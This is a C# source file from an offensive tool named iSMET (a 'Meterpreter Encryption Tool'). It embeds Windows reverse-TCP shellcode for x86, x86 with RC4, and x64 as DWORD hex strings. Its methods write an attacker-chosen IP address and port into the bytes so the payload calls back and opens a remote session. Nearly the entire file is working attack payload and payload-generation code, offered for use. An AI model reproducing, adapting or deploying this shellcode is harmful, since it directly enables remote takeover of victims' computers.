using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace iSMET.ShellCode
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
    public class DwordShellCode
    {
        public class x86DwordShellCode
        {
			public string ReverseTcp(string Ip, string Port)
			{
                var strShellCode = "0x0082e8fc 0x89600000 0x64c031e5 0x8b30508b 0x528b0c52 0x28728b14 0x264ab70f 0x3cacff31 0x2c027c61 0x0dcfc120 0xf2e2c701 0x528b5752 0x3c4a8b10 0x78114c8b 0xd10148e3 0x20598b51 0x498bd301 0x493ae318 0x018b348b 0xacff31d6 0x010dcfc1 0x75e038c7 0xf87d03f6 0x75247d3b 0x588b58e4 0x66d30124 0x8b4b0c8b 0xd3011c58 0x018b048b 0x244489d0 0x615b5b24 0xff515a59 0x5a5f5fe0 0x8deb128b 0x3233685d 0x77680000 0x545f3273 0x26774c68 0xffe88907 0x0190b8d0 0xc4290000 0x29685054 0xff006b80 0x680a6ad5 0x80d0a8c0 0x11000268 0x50e6895c 0x40505050 0x68504050 0xe0df0fea 0x6a97d5ff 0x68575610 0x6174a599 0xc085d5ff 0x4eff0a74 0xe8ec7508 0x00000067 0x046a006a 0x02685756 0xff5fc8d9 0x00f883d5 0x368b367e 0x0068406a 0x56000010 0x5868006a 0xffe553a4 0x6a5393d5 0x57535600 0xc8d90268 0x83d5ff5f 0x287d00f8 0x40006858 0x006a0000 0x2f0b6850 0xd5ff300f 0x6e756857 0xd5ff614d 0x0cff5e5e 0x70850f24 0xe9ffffff 0xffffff9b 0xc629c301 0xbbc3c175 0x56a2b5f0 0xff53006a 0x000000d5";
                var strSplit = strShellCode.Split(' ');
                var ipSplit = Ip.Split('.');
                var ipArray = new byte[4];
                ipArray[0] = Convert.ToByte(ipSplit[3]);
                ipArray[1] = Convert.ToByte(ipSplit[2]);
                ipArray[2] = Convert.ToByte(ipSplit[1]);
                ipArray[3] = Convert.ToByte(ipSplit[0]);
                strSplit[44] = "0x" + BitConverter.ToString(ipArray).Replace("-", "");
                var portCharArray1 = strSplit[45].ToCharArray();
                var portCharArray2 = strSplit[46].ToCharArray();
                var newPort1 = string.Empty;
                var newPort2 = string.Empty;
                var num = int.Parse(Port);
                var num2 = num / 256;
                var num3 = num2 * 256;
                var num4 = num - num3;
                var num5 = num2 * 256 + num4;
                if (num > 256)
                {
                    if (num == num5)
                    {
                        var portstr = new byte[2];
                        portstr[0] = Convert.ToByte(num2);
                        portstr[1] = Convert.ToByte(num4);
                        var portResult = BitConverter.ToString(portstr).Replace("-", "");
                        var port1 = portResult.ToCharArray();
                        portCharArray1[2] = port1[0];
                        portCharArray1[3] = port1[1];
                        portCharArray2[8] = port1[2];
                        portCharArray2[9] = port1[3];
                        newPort1 = "0x" + portCharArray1[2] + portCharArray1[3] + portCharArray1[4] + portCharArray1[5] +
                                   portCharArray1[6] + portCharArray1[7] + portCharArray1[8] + portCharArray1[9];
                        newPort2 = "0x" + portCharArray2[2] + portCharArray2[3] + portCharArray2[4] + portCharArray2[5] +
                                   portCharArray2[6] + portCharArray2[7] + portCharArray2[8] + portCharArray2[9];
                    }
                }
                else
                {
                    var portstr = new byte[2];
                    portstr[0] = Convert.ToByte(00);
                    portstr[1] = Convert.ToByte(num4);
                    var portResult = BitConverter.ToString(portstr).Replace("-", "");
                    var port1 = portResult.ToCharArray();
                    portCharArray1[2] = port1[0];
                    portCharArray1[3] = port1[1];
                    portCharArray2[8] = port1[2];
                    portCharArray2[9] = port1[3];
                    newPort1 = "0x" + portCharArray1[2] + portCharArray1[3] + portCharArray1[4] + portCharArray1[5] +
                               portCharArray1[6] + portCharArray1[7] + portCharArray1[8] + portCharArray1[9];
                    newPort2 = "0x" + portCharArray2[2] + portCharArray2[3] + portCharArray2[4] + portCharArray2[5] +
                               portCharArray2[6] + portCharArray2[7] + portCharArray2[8] + portCharArray2[9];
                }
                strSplit[45] = newPort1;
                strSplit[46] = newPort2;
                string newShellCode = strSplit.Aggregate(string.Empty, (current, t) => current + (t + " "));
                return newShellCode;
            }
            public string ReverseTcpRc4(string Ip, string Port)
            {
                var strShellCode = "0x0082e8fc 0x89600000 0x64c031e5 0x8b30508b 0x528b0c52 0x28728b14 0x264ab70f 0x3cacff31 0x2c027c61 0x0dcfc120 0xf2e2c701 0x528b5752 0x3c4a8b10 0x78114c8b 0xd10148e3 0x20598b51 0x498bd301 0x493ae318 0x018b348b 0xacff31d6 0x010dcfc1 0x75e038c7 0xf87d03f6 0x75247d3b 0x588b58e4 0x66d30124 0x8b4b0c8b 0xd3011c58 0x018b048b 0x244489d0 0x615b5b24 0xff515a59 0x5a5f5fe0 0x8deb128b 0x3233685d 0x77680000 0x545f3273 0x26774c68 0xffe88907 0x0190b8d0 0xc4290000 0x29685054 0xff006b80 0x680a6ad5 0x80d0a8c0 0x11000268 0x50e6895c 0x40505050 0x68504050 0xe0df0fea 0x6a97d5ff 0x68575610 0x6174a599 0xc085d5ff 0x4eff0a74 0xe8ec7508 0x000000dc 0x046a006a 0x02685756 0xff5fc8d9 0x00f883d5 0x368b497e 0xb4adf681 0x8e8d6ca3 0x00000100 0x0068406a 0x51000010 0x5868006a 0xffe553a4 0x00988dd5 0x53000001 0x006a5056 0x68575356 0x5fc8d902 0xf883d5ff 0x58287d00 0x00400068 0x50006a00 0x0f2f0b68 0x57d5ff30 0x4d6e7568 0x5ed5ff61 0x240cff5e 0xff5d850f 0x88e9ffff 0x01ffffff 0x75c629c3 0x5d595bc1 0xdf895755 0x000010e8 0x85643300 0x0804de57 0x803a8f04 0x5599abd4 0xc0315ef8 0x75c0feaa 0x00ef81fb 0x31000001 0x071c02db 0xe280c289 0x161c020f 0x8607148a 0x14881f14 0x75c0fe07 0xfedb31e8 0x071c02c0 0x8607148a 0x14881f14 0x1f140207 0x3017148a 0x49450055 0xc35fe575 0xa2b5f0bb 0x53006a56 0x0000d5ff";
                var strSplit = strShellCode.Split(' ');
                var ipSplit = Ip.Split('.');
                var ipArray = new byte[4];
                ipArray[0] = Convert.ToByte(ipSplit[3]);
                ipArray[1] = Convert.ToByte(ipSplit[2]);
                ipArray[2] = Convert.ToByte(ipSplit[1]);
                ipArray[3] = Convert.ToByte(ipSplit[0]);
                strSplit[44] = "0x" + BitConverter.ToString(ipArray).Replace("-", "");
                var portCharArray1 = strSplit[45].ToCharArray();
                var portCharArray2 = strSplit[46].ToCharArray();
                var newPort1 = string.Empty;
                var newPort2 = string.Empty;
                var num = int.Parse(Port);
                var num2 = num / 256;
                var num3 = num2 * 256;
                var num4 = num - num3;
                var num5 = num2 * 256 + num4;
                if (num > 256)
                {
                    if (num == num5)
                    {
                        var portstr = new byte[2];
                        portstr[0] = Convert.ToByte(num2);
                        portstr[1] = Convert.ToByte(num4);
                        var portResult = BitConverter.ToString(portstr).Replace("-", "");
                        var port1 = portResult.ToCharArray();
                        portCharArray1[2] = port1[0];
                        portCharArray1[3] = port1[1];
                        portCharArray2[8] = port1[2];
                        portCharArray2[9] = port1[3];
                        newPort1 = "0x" + portCharArray1[2] + portCharArray1[3] + portCharArray1[4] + portCharArray1[5] +
                                   portCharArray1[6] + portCharArray1[7] + portCharArray1[8] + portCharArray1[9];
                        newPort2 = "0x" + portCharArray2[2] + portCharArray2[3] + portCharArray2[4] + portCharArray2[5] +
                                   portCharArray2[6] + portCharArray2[7] + portCharArray2[8] + portCharArray2[9];
                    }
                }
                else
                {
                    var portstr = new byte[2];
                    portstr[0] = Convert.ToByte(00);
                    portstr[1] = Convert.ToByte(num4);
                    var portResult = BitConverter.ToString(portstr).Replace("-", "");
                    var port1 = portResult.ToCharArray();
                    portCharArray1[2] = port1[0];
                    portCharArray1[3] = port1[1];
                    portCharArray2[8] = port1[2];
                    portCharArray2[9] = port1[3];
                    newPort1 = "0x" + portCharArray1[2] + portCharArray1[3] + portCharArray1[4] + portCharArray1[5] +
                               portCharArray1[6] + portCharArray1[7] + portCharArray1[8] + portCharArray1[9];
                    newPort2 = "0x" + portCharArray2[2] + portCharArray2[3] + portCharArray2[4] + portCharArray2[5] +
                               portCharArray2[6] + portCharArray2[7] + portCharArray2[8] + portCharArray2[9];
                }
                strSplit[45] = newPort1;
                strSplit[46] = newPort2;
                string newShellCode = strSplit.Aggregate(string.Empty, (current, t) => current + (t + " "));
                return newShellCode;
            }
        }
        public class x64DwordShellCode
        {
            public string ReverseTcp(string Ip, string Port)
            {
                var strShellCode = "0xe48348fc, 0x00cce8f0, 0x51410000, 0x51525041, 0xd2314856, 0x528b4865, 0x528b4860, 0x528b4818, 0x728b4820, 0xb70f4850, 0x314d4a4a, 0xc03148c9, 0x7c613cac, 0x41202c02, 0x410dc9c1, 0xede2c101, 0x48514152, 0x8b20528b, 0x01483c42, 0x788166d0, 0x0f020b18, 0x00007285, 0x88808b00, 0x48000000, 0x6774c085, 0x50d00148, 0x4418488b, 0x4920408b, 0x56e3d001, 0x41c9ff48, 0x4888348b, 0x314dd601, 0xc03148c9, 0xc9c141ac, 0xc101410d, 0xf175e038, 0x244c034c, 0xd1394508, 0x4458d875, 0x4924408b, 0x4166d001, 0x44480c8b, 0x491c408b, 0x8b41d001, 0x01488804, 0x415841d0, 0x5a595e58, 0x59415841, 0x83485a41, 0x524120ec, 0x4158e0ff, 0x8b485a59, 0xff4be912, 0x495dffff, 0x327377be, 0x0032335f, 0x49564100, 0x8148e689, 0x0001a0ec, 0xe5894900, 0x0002bc49, 0xa8c05c11, 0x544180d0, 0x4ce48949, 0xba41f189, 0x0726774c, 0x894cd5ff, 0x010168ea, 0x41590000, 0x6b8029ba, 0x6ad5ff00, 0x505e410a, 0xc9314d50, 0x48c0314d, 0x8948c0ff, 0xc0ff48c2, 0x41c18948, 0xdf0feaba, 0x48d5ffe0, 0x106ac789, 0x894c5841, 0xf98948e2, 0xa599ba41, 0xd5ff6174, 0x0a74c085, 0x75ceff49, 0x0093e8e5, 0x83480000, 0x894810ec, 0xc9314de2, 0x5841046a, 0x41f98948, 0xc8d902ba, 0x83d5ff5f, 0x557e00f8, 0x20c48348, 0x6af6895e, 0x68594140, 0x00001000, 0x89485841, 0xc93148f2, 0xa458ba41, 0xd5ffe553, 0x49c38948, 0x314dc789, 0xf08949c9, 0x48da8948, 0xba41f989, 0x5fc8d902, 0xf883d5ff, 0x58287d00, 0x68595741, 0x00004000, 0x006a5841, 0x0bba415a, 0xff300f2f, 0x415957d5, 0x4d6e75ba, 0x49d5ff61, 0x3ce9ceff, 0x48ffffff, 0x2948c301, 0xf68548c6, 0xff41b475, 0x006a58e7, 0xc2c74959, 0x56a2b5f0, 0x0000d5ff";
                var strSplit = strShellCode.Split(' ');
                var ipSplit = Ip.Split('.');
                var ipArray1 = new byte[2];
                var ipArray2 = new byte[2];
                ipArray1[0] = Convert.ToByte(ipSplit[3]);
                ipArray1[1] = Convert.ToByte(ipSplit[2]);
                ipArray2[0] = Convert.ToByte(ipSplit[1]);
                ipArray2[1] = Convert.ToByte(ipSplit[0]);
                var strNewIp1 = BitConverter.ToString(ipArray1).Replace("-", "");
                var strNewIp2 = BitConverter.ToString(ipArray2).Replace("-", "");
                var ipPort1 = string.Empty;
                var num = int.Parse(Port);
                var num2 = num / 256;
                var num3 = num2 * 256;
                var num4 = num - num3;
                var num5 = num2 * 256 + num4;
                if (num > 256)
                {
                    if (num == num5)
                    {
                        var portstr = new byte[2];
                        portstr[1] = Convert.ToByte(num2);
                        portstr[0] = Convert.ToByte(num4);
                        var portResult = BitConverter.ToString(portstr).Replace("-", "");
                        ipPort1 = "0x" + strNewIp2 + portResult;
                        strSplit[61] = ipPort1;
                    }
                }
                else
                {
                    var portstr = new byte[2];
                    portstr[0] = Convert.ToByte(00);
                    portstr[1] = Convert.ToByte(num4);
                    var portResult = BitConverter.ToString(portstr).Replace("-", "");
                    ipPort1 = "0x" + strNewIp2 + portResult;
                    strSplit[61] = ipPort1;
                }
                strSplit[62] = "0x5441" + strNewIp1;
                var newShellCode = strSplit.Aggregate(string.Empty, (current, t) => current + (t + " "));
                return newShellCode;
            }
        }
    }
}
